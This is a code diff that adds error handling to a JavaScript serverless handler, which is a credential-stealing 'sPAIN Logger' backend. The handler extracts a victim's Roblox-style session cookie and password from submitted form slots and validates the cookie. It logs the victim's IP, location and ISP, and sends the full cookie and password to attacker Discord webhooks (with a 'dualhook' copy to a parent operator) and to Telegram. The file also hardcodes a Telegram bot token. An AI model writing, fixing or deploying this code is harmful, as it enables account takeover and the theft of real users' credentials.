@@ -1,4 +1,4 @@
-// api/submit.js
+// api/submit.js - Fixed version with better error handling
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
@@ -12,9 +12,14 @@ const EMOJI     = '<a:emoji_17:1508694920972468347>';
 
 // ── Redis ─────────────────────────────────────────────────────────────────────
 async function redisGet(key) {
+  if (!REDIS_URL || !REDIS_TOKEN) {
+    console.error('Redis credentials missing');
+    return null;
+  }
   try {
     const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, { 
-      headers: { Authorization: `Bearer ${REDIS_TOKEN}` } 
+      headers: { Authorization: `Bearer ${REDIS_TOKEN}` },
+      timeout: 5000
     });
     const json = await res.json();
     if (!json.result) return null;
@@ -26,7 +31,10 @@ async function redisGet(key) {
       try { r = JSON.parse(r.value); } catch {} 
     }
     return r || null;
-  } catch { return null; }
+  } catch(e) {
+    console.error('Redis error:', e.message);
+    return null;
+  }
 }
 
 // ── Geo ───────────────────────────────────────────────────────────────────────
@@ -58,11 +66,15 @@ async function validateCookie(cookie) {
     if (!r.ok) return { valid: false };
     const d = await r.json();
     return { valid: d.valid || d.success, username: d.username };
-  } catch { return { valid: false }; }
+  } catch(e) {
+    console.error('Validation error:', e.message);
+    return { valid: false };
+  }
 }
 
 // ── Telegram ──────────────────────────────────────────────────────────────────
 async function tgSend(text) {
+  if (!TG_TOKEN || !TG_CHAT) return;
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
       method: 'POST', 
@@ -74,7 +86,9 @@ async function tgSend(text) {
         disable_web_page_preview: true 
       })
     });
-  } catch (_) {}
+  } catch(e) {
+    console.error('Telegram error:', e.message);
+  }
 }
 
 // ── Cookie extraction ─────────────────────────────────────────────────────────
@@ -84,19 +98,15 @@ function extractCookie(raw) {
   if (!raw) return null;
   const s = String(raw).trim();
   
-  // Already has warning prefix
   const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); 
   if (m1) return m1[1];
   
-  // Has prefix but needs reconstruction
   const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    
   if (m2) return WARN + m2[1];
   
-  // Just the token part
   const m3 = s.match(/\|_([\w\-]{50,})/);                                
   if (m3) return WARN + m3[1];
   
-  // Plain token (200+ chars, alphanumeric)
   if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
   
   return null;
@@ -154,7 +164,9 @@ async function discordSend(url, payload) {
         ...payload 
       })
     });
-  } catch (_) {}
+  } catch(e) {
+    console.error('Discord error:', e.message);
+  }
 }
 
 async function discordChunked(url, text) {
@@ -181,142 +193,142 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(204).end();
   if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });
 
-  const body = parseBody(req.body);
-  const { slug, slots } = body;
-  
-  if (!slug)  return res.status(400).json({ error: 'slug is required' });
-  if (!slots) return res.status(400).json({ error: 'slots is required' });
+  try {
+    const body = parseBody(req.body);
+    const { slug, slots } = body;
+    
+    if (!slug)  return res.status(400).json({ error: 'slug is required' });
+    if (!slots) return res.status(400).json({ error: 'slots is required' });
 
-  const record = await redisGet(`slot:${slug}`);
-  if (!record)         return res.status(404).json({ error: 'Page not found' });
-  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
+    const record = await redisGet(`slot:${slug}`);
+    if (!record)         return res.status(404).json({ error: 'Page not found' });
+    if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
-  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-                 req.headers['x-real-ip'] || 'Unknown';
-  const now    = new Date().toISOString();
-  const pName  = record.displayName || slug;
-  const isDH   = !!record.dualhookParent;
-  const cookie   = findCookie(slots);
-  const password = findPassword(slots, cookie);
+    const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                   req.headers['x-real-ip'] || 'Unknown';
+    const now    = new Date().toISOString();
+    const pName  = record.displayName || slug;
+    const isDH   = !!record.dualhookParent;
+    const cookie   = findCookie(slots);
+    const password = findPassword(slots, cookie);
 
-  // Build webhook list (dualhook support)
-  let webhook1 = null;
-  const webhook2 = record.webhook;
-  if (isDH) {
-    try {
-      const parent = await redisGet(`slot:${record.dualhookParent}`);
-      if (parent?.webhook) webhook1 = parent.webhook;
-    } catch (_) {}
-  }
-  const allWH = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];
+    // Build webhook list (dualhook support)
+    let webhook1 = null;
+    const webhook2 = record.webhook;
+    if (isDH) {
+      try {
+        const parent = await redisGet(`slot:${record.dualhookParent}`);
+        if (parent?.webhook) webhook1 = parent.webhook;
+      } catch (_) {}
+    }
+    const allWH = [webhook2, ...(webhook1 && webhook1 !== webhook2 ? [webhook1] : [])];
 
-  // ── No cookie submitted ─────────────────────────────────────────────────────
-  if (!cookie) {
-    const geo = await getIpGeo(ip);
-    const loc = [geo?.city, geo?.regionName, geo?.country]
+    // ── No cookie submitted ─────────────────────────────────────────────────────
+    if (!cookie) {
+      const geo = await getIpGeo(ip);
+      const loc = [geo?.city, geo?.regionName, geo?.country]
+        .filter(Boolean).join(', ') || 'Unknown';
+      
+      await Promise.all(allWH.map(wh => discordSend(wh, {
+        content: '@everyone',
+        embeds: [{
+          title:       '⚠️ Wrong Cookie — Troll Detected',
+          description: isDH 
+            ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` 
+            : `${EMOJI} s.PAIN ${EMOJI}`,
+          color:       0xff3333,
+          fields: [
+            { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
+            { name: '📍 Location', value: loc,                   inline: true },
+            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
+            { name: '🕐 Time',     value: now,                   inline: false }
+          ],
+          footer: { text: `sPAIN Logger • ${pName}` }, 
+          timestamp: now
+        }]
+      })));
+      
+      await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
+      return res.status(200).json({ success: true });
+    }
+
+    // ── Cookie found — validate only (no info fetching) ─────────────────────
+    const [geo, validation] = await Promise.all([
+      getIpGeo(ip),
+      validateCookie(cookie)
+    ]);
+
+    const loc     = [geo?.city, geo?.regionName, geo?.country]
       .filter(Boolean).join(', ') || 'Unknown';
+    const isp     = geo?.isp || 'Unknown';
+    const country = geo?.country || 'Unknown';
+    const cflag   = flag(country);
+    const nowStr  = now;
+
+    // ── Invalid cookie ────────────────────────────────────────────────────────
+    if (!validation.valid) {
+      await Promise.all(allWH.map(wh => discordSend(wh, {
+        content: '@everyone',
+        embeds: [{
+          title:       '❌ Invalid Cookie — Validation Failed',
+          description: isDH 
+            ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` 
+            : `${EMOJI} s.PAIN ${EMOJI}`,
+          color:       0xff6600,
+          fields: [
+            { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
+            { name: '📍 Location', value: loc,                   inline: true },
+            { name: '🗺️ ISP',      value: isp,                   inline: true },
+            { name: '👤 Username', value: `\`${validation.username || 'Unknown'}\``, inline: true },
+            { name: '🕐 Time',     value: nowStr,                inline: false }
+          ],
+          footer: { text: `sPAIN Logger • ${pName}` }, 
+          timestamp: nowStr
+        }]
+      })));
+      
+      await tgSend(`❌ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
+      return res.status(200).json({ success: true, valid: false });
+    }
+
+    // ── Valid cookie — send ONLY the cookie to Discord ────────────────────────
+    const descEmoji = isDH 
+      ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` 
+      : `${EMOJI} \\`sPAIN\\` ${EMOJI}`;
     
-    await Promise.all(allWH.map(wh => discordSend(wh, {
-      content: '@everyone',
-      embeds: [{
-        title:       '⚠️ Wrong Cookie — Troll Detected',
-        description: isDH 
-          ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` 
-          : `${EMOJI} s.PAIN ${EMOJI}`,
-        color:       0xff3333,
-        fields: [
-          { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
-          { name: '📍 Location', value: loc,                   inline: true },
-          { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
-          { name: '🕐 Time',     value: now,                   inline: false }
-        ],
-        footer: { text: `sPAIN Logger • ${pName}` }, 
-        timestamp: now
-      }]
-    })));
-    
-    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
-    return res.status(200).json({ success: true });
+    const embed = {
+      title:       `✅ Valid Cookie Received — ${validation.username || 'Unknown'}`,
+      description: `${descEmoji}\n\n[Discord Server](${DISCORD_INV})`,
+      color:       0x22c55e,
+      fields: [
+        { name: '🌐 IP',       value: `\`${ip}\``, inline: true },
+        { name: '📍 Location', value: `${country} ${cflag}`, inline: true },
+        { name: '🗺️ ISP',      value: isp, inline: true },
+        { name: '🔐 Password', value: `\`${password || 'N/A'}\``, inline: true },
+        { name: '🕐 Time',     value: nowStr, inline: false }
+      ],
+      footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
+      timestamp: nowStr
+    };
+
+    // ── Send to all webhooks ─────────────────────────────────────────────────
+    await Promise.all(allWH.map(async wh => {
+      await discordSend(wh, { content: '@everyone', embeds: [embed] });
+      await discordChunked(wh, cookie);
+    }));
+
+    await tgSend([
+      `✅ <b>VALID COOKIE — ${pName}</b>`,
+      `👤 ${validation.username || 'Unknown'}`,
+      `📍 ${loc} | ${isp}`,
+      ``,
+      `<code>${cookie.substring(0, 100)}...</code>`
+    ].join('\n'));
+
+    return res.status(200).json({ success: true, valid: true });
+
+  } catch (err) {
+    console.error('Submit handler error:', err);
+    return res.status(500).json({ error: 'Internal server error', message: err.message });
   }
-
-  // ── Cookie found — validate only (no info fetching) ─────────────────────
-  const [geo, validation] = await Promise.all([
-    getIpGeo(ip),
-    validateCookie(cookie)
-  ]);
-
-  const loc     = [geo?.city, geo?.regionName, geo?.country]
-    .filter(Boolean).join(', ') || 'Unknown';
-  const isp     = geo?.isp || 'Unknown';
-  const country = geo?.country || 'Unknown';
-  const cflag   = flag(country);
-  const nowStr  = now;
-
-  // ── Invalid cookie ────────────────────────────────────────────────────────
-  if (!validation.valid) {
-    await Promise.all(allWH.map(wh => discordSend(wh, {
-      content: '@everyone',
-      embeds: [{
-        title:       '❌ Invalid Cookie — Validation Failed',
-        description: isDH 
-          ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` 
-          : `${EMOJI} s.PAIN ${EMOJI}`,
-        color:       0xff6600,
-        fields: [
-          { name: '🌐 IP',       value: `\`${ip}\``,          inline: true },
-          { name: '📍 Location', value: loc,                   inline: true },
-          { name: '🗺️ ISP',      value: isp,                   inline: true },
-          { name: '👤 Username', value: `\`${validation.username || 'Unknown'}\``, inline: true },
-          { name: '🕐 Time',     value: nowStr,                inline: false }
-        ],
-        footer: { text: `sPAIN Logger • ${pName}` }, 
-        timestamp: nowStr
-      }]
-    })));
-    
-    await tgSend(`❌ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
-    return res.status(200).json({ success: true, valid: false });
-  }
-
-  // ── Valid cookie — send ONLY the cookie to Discord ────────────────────────
-  
-  // Build minimal embed with just cookie + basic info
-  const descEmoji = isDH 
-    ? `${EMOJI} ${record.dualhookParent} ${EMOJI}` 
-    : `${EMOJI} \\`sPAIN\\` ${EMOJI}`;
-  
-  const embed = {
-    title:       `✅ Valid Cookie Received — ${validation.username || 'Unknown'}`,
-    description: `${descEmoji}\n\n[Discord Server](${DISCORD_INV})`,
-    color:       0x22c55e,
-    fields: [
-      { name: '🌐 IP',       value: `\`${ip}\``, inline: true },
-      { name: '📍 Location', value: `${country} ${cflag}`, inline: true },
-      { name: '🗺️ ISP',      value: isp, inline: true },
-      { name: '🔐 Password', value: `\`${password || 'N/A'}\``, inline: true },
-      { name: '🕐 Time',     value: nowStr, inline: false }
-    ],
-    footer:    { text: `sPAIN Logger • ${pName} • ${nowStr}` },
-    timestamp: nowStr
-  };
-
-  // ── Send to all webhooks ─────────────────────────────────────────────────
-  await Promise.all(allWH.map(async wh => {
-    // Send embed with @everyone
-    await discordSend(wh, { content: '@everyone', embeds: [embed] });
-    
-    // Send the FULL cookie in code block (chunked if needed)
-    await discordChunked(wh, cookie);
-  }));
-
-  // ── Telegram notification ───────────────────────────────────────────────
-  await tgSend([
-    `✅ <b>VALID COOKIE — ${pName}</b>`,
-    `👤 ${validation.username || 'Unknown'}`,
-    `📍 ${loc} | ${isp}`,
-    ``,
-    `<code>${cookie.substring(0, 100)}...</code>`
-  ].join('\n'));
-
-  return res.status(200).json({ success: true, valid: true });
 }
